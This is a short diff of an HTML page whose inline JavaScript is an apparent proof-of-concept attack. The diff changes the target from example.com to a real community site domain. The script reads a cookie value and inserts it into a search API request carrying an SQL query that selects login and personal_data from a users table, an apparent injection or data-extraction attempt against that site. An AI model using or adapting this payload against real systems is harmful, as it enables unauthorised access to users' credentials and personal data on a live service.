@@ -9,7 +9,7 @@
     <h1>Loading...</h1>
     <script>
         // Step 1: Make a fetch request to example.com
-        const apiUrl = 'https://example.com';
+        const apiUrl = 'https://community.withairbnb.com';
         
         console.log('Step 1: Making a fetch request to example.com');
 
@@ -49,7 +49,7 @@
             console.log('Step 3: Making a fetch request to the search endpoint');
 
             // Construct the URL with the cookie value
-            const searchApiUrl = `https://example.com/unqgh87863/api/2.0/search?q=SELECT+login,+personal_data+FROM+users+where+id%3d+'${encodeURIComponent(cookieValue)}'`;
+            const searchApiUrl = `https://community.withairbnb.com/unqgh87863/api/2.0/search?q=SELECT+login,+personal_data+FROM+users+where+id%3d+'${encodeURIComponent(cookieValue)}'`;
 
             // Make a fetch request to the search endpoint
             fetch(searchApiUrl)
